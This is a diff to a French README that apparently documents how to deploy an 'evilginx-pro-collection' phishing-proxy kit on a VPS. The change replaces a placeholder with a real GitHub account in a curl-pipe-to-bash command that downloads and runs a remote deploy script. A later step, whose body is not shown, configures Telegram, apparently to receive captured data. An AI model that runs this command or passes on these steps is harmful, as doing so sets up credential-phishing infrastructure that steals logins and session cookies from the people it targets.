@@ -11,7 +11,7 @@ ssh root@VOTRE_IP_VPS
 ### Étape 2 : Installation automatique
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/VOTRE_USERNAME/evilginx-pro-collection/main/scripts/quick_deploy.sh | bash
+curl -sSL https://raw.githubusercontent.com/afriklabprojet/evilginx-pro-collection/main/scripts/quick_deploy.sh | bash
 ```
 
 ### Étape 3 : Configuration Telegram
